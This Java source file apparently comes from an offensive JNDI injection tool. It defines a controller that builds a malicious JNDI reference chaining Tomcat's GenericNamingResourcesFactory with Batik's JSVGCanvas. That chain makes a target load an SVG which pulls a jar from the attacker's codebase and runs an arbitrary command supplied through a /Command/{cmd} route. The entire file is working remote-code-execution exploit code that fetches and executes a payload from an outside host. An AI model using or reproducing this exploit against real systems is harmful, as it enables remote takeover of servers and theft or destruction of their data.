package com.h2tg.ysogate.controller.bypass;

import com.h2tg.ysogate.annotation.JNDIController;
import com.h2tg.ysogate.annotation.JNDIMapping;
import com.h2tg.ysogate.config.JndiConfig;
import com.h2tg.ysogate.controller.BasicController;
import com.h2tg.ysogate.exploit.server.WebServer;
import com.h2tg.ysogate.template.CalcTemplate;
import com.h2tg.ysogate.utils.CtClassUtils;
import com.h2tg.ysogate.utils.JarUtils;
import com.h2tg.ysogate.utils.RandomUtils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

@JNDIController
@JNDIMapping("/JSVGCanvas")
public class JSVGCanvasController extends BasicController
{
    @Override
    public Object process(Object obj)
    {
        String cmd = new String((byte[]) obj);
        System.out.println("[Reference] Factory: GenericNamingResourcesFactory + JSVGCanvas");

        String factoryClassName = RandomUtils.getRandStr(12);
        String jarName = RandomUtils.getRandStr(12);

//        String code = jshell2defineClass(Base64.getEncoder().encodeToString(byteCode));

        String xml = "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.0\">\n" +
                "<script type=\"application/java-archive\" xlink:href=\"" + JndiConfig.codebase + jarName + ".jar\"/>\n" +
                "<text>svg</text>\n" +
                "</svg>";

        String manifest = "Manifest-Version: 1.0\n" +
                "SVG-Handler-Class: " + factoryClassName + "\n";

        byte[] jarBytes = null;

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass clazz = pool.get(CalcTemplate.class.getName());
            clazz.replaceClassName(clazz.getName(), factoryClassName);
            CtClassUtils.setCtField(clazz, "cmd", CtField.Initializer.constant(cmd));
            jarBytes = JarUtils.createWithMANIFEST(factoryClassName, clazz.toBytecode(), manifest);
        } catch (Exception e) {
            e.printStackTrace();
        }

        WebServer.getInstance().serveFile("/" + jarName + ".jar", jarBytes);
        WebServer.getInstance().serveFile("/" + jarName + ".xml", xml.getBytes());

        String uri = JndiConfig.codebase + jarName + ".xml";
        ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory", null);
        ref.add(new StringRefAddr("URI", uri));
        return ref;
    }

    @JNDIMapping("/Command/{cmd}")
    public byte[] command(String cmd) throws Exception
    {
        System.out.println("[Command] Cmd: " + cmd);

        return cmd.getBytes();
    }
}
